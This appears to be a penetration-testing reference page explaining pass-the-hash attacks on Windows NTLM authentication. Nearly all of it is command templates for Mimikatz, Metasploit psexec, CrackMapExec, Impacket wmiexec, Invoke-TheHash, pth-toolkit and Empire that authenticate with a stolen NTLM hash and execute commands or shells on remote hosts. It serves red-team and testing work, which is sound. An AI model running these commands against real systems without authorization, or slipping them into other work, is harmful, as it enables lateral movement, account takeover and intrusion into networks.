# How-To Pass-the-hash (PtH)
NetNTLM is a Windows challenge-response protocol that is mainly used where Kerberos is not supported. In NetNTLM, the server sends to the client a random 8-byte nonce as a challenge, and the client calculates a response that processes the challenge with the NTLM hash as the key, which is the MD4 hash of the user's password. Because the NTLM hash is the key to calculate the response, the victim's cleartext password is not required to authenticate, hence retrieving the NTLM hash is almost equivalent to stealing a plain text password.

You can use many many tools to perform PtH. The only required things are:
* A username (and its domain if not local...)
* Its NTLM hash

Do not forget to analyze the [password policy](PasspolAuditing.md), you could block accounts! Be smart...

## Mimikatz
### Original binary
```
mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM>
```

### Powershell version
```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell.exe"'
```

## Metasploit
1. Testing credentials
```
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set RHOSTS <hosts>
RHOSTS => <host>
msf auxiliary(smb_login) > set SMBDomain <domain>
SMBDOMAIN => <domain>
msf auxiliary(smb_login) > set SMBUser <user>
SMBUser => <user>
msf auxiliary(smb_login) > set SMBPass <LM>:<NTLM>
SMBPass => <LM>:<NTLM>
msf auxiliary(smb_login) > run
```
> If you were using msfconsole and stored your network scans within its database you could use
**services -p 445 -R** to to populate RHOSTS with every host with 445 open

2. Exploit
```
msf > use windows/smb/psexec
msf exploit(psexec) > set RHOST <host>
RHOST => <host>
msf exploit(psexec) > set SMBUser <username>
SMBUser => <username>
msf exploit(psexec) > set SMBPass <LM>:<NTLM>
SMBPass => <LM>:<NTLM>
msf exploit(psexec) > exploit
```
> You could also use **auxiliary/admin/smb/psexec_command**

## CrackMapExec
https://github.com/byt3bl33d3r/CrackMapExec
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> -H <NTLM>
```
> CME for Windows: https://github.com/maaaaz/CrackMapExecWin/wiki/How-to-compile-CrackMapExec-for-Windows

## Impacket
https://github.com/CoreSecurity/impacket/
* psexec.py
* smbexec.py
* wmiexec.py
* atexec.py
* dcomexec.py
* etc.

Example:
```
python wmiexec.py -hashes :<ntlm> <user>@<server>
```
> Impacket examples for Windows: https://github.com/maaaaz/impacket-examples-windows

## Invoke-TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash
* Invoke-WMIExec
* Invoke-SMBExec
* Invoke-SMBEnum
* Invoke-SMBClient
* Invoke-TheHash

Example:
```
Invoke-WMIExec -Target <server> -Domain <domain> -Username <user> -Hash <NTLM> -Command <command_or_binary>
```

## pth-toolkit
* pth-net
* pth-rpcclient
* pth-smbclient
* pth-smbget
* pth-winexe
* pth-wmic
* pth-wmis
> pth-* uses the format <domain>/<user>%h<LM>:<NTLM>

Example:
```
pth-winexe -U <domain>/<user>%h<LM>:<NTLM> //<server> cmd.exe
```

## Empire
```
(Empire: <agent_name>) > pth <credID>
```
> Pass-the-hash through Invoke-Mimikaz's sekurlsa::pth function
